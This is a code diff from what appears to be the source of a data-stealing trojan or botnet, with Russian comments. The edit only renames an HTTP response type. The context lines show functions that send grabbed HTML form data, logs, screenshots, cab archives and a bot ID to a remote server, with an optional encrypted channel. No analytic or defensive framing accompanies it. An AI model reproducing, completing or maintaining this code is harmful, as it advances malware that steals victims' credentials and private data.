@@ -810,7 +810,7 @@ bool ExecuteFile( char *Url, WCHAR *FileName )
 
 //----------------------------------------------------------------------------
 
-bool CheckValidPostResult(PHTTPResponse Response, PCHAR HTMLDocument)
+bool CheckValidPostResult(PHTTPResponseRec Response, PCHAR HTMLDocument)
 {
 	// Функция проверяет ответ сервера и возвращает истину если сервер успешно
 	// принял отправленные данные
@@ -866,7 +866,7 @@ bool SendRemoteLog(PCHAR Type, PCHAR Log, LPBYTE ScreenShot, DWORD ScreenSize, P
 	}
 
 	// Отправляем запрос
-	THTTPResponse Response;
+	THTTPResponseRec Response;
 	ClearStruct(Response);
 
 	bool Result = HTTP::Post(URL, Data, NULL, &Response);
@@ -898,7 +898,7 @@ bool SendGrabberReport(PCHAR URL, PCHAR Buf, DWORD BufSize)
 	AddURLParam(Fields, "base", Buf, BufSize);
     STR::Free(BotID);
 
-	THTTPResponse Response;
+	THTTPResponseRec Response;
     ClearStruct(Response);
 
 	#ifdef CryptHTTPH
@@ -1859,7 +1859,7 @@ bool DataGrabber::SendHTMLDataToServer(PCHAR URL, PSendHTMLData Data, PCHAR *HTM
 	STR::Free(BT);
 	STR::Free(DT);
 	// Отправляем форму
-	THTTPResponse Response;
+	THTTPResponseRec Response;
 	ClearStruct(Response);
 	#ifdef CryptHTTPH
         PCHAR Password = GetMainPassword();
@@ -1979,7 +1979,7 @@ bool DataGrabber::SendCab(PCHAR URL, PCHAR CabFileName, PCHAR AppName, bool* Inv
 	STR::Free(BotID);
 
 	// Отправляем запрос
-	THTTPResponse Response;
+	THTTPResponseRec Response;
 	ClearStruct(Response);
 
     bool Result = HTTP::Post(URL, Data, NULL, &Response);
